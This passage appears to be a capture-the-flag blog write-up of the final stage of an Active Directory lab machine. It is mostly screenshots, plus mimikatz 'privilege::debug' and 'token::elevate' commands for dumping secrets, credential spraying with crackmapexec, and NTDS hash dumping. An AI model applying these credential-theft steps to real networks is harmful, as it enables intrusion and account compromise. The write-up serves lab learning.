+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_70.png' | relative_url }})
+<br/><br/>
+Now we are administrators, but there’s no root flag yet
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_71.png' | relative_url }})
+<br/><br/>
+Upload mimikatz
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_72.png' | relative_url }})
+<br/><br/>
+We tried to dump sam hashes, secrets and logonpasswords but anything there
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_73.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_74.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_75.png' | relative_url }})
+<br/><br/>
+we need to set and upload the privilege before, use:
+<br/><br/>
+
+```python
+privilege::debug
+token::elevate
+```
+
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_76.png' | relative_url }})
+<br/><br/>
+Now dump secrets, default password got it
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_77.png' | relative_url }})
+<br/><br/>
+After a guessing or spraying process with crackmapexec the one you prefer, we realize those are useful creds for Choco.L, logon as him and check privileges in DC
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_78.png' | relative_url }})
+<br/><br/>
+That means Chocho is a privileged user in here who can dump hashes using `—ntds` with crackmapexec to get information from ntds.dir which is an Active Directory database where creds are stored
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_79.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4_image_80.png' | relative_url }})
+<br/><br/>
+Finally machine pwned!!!
+<script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
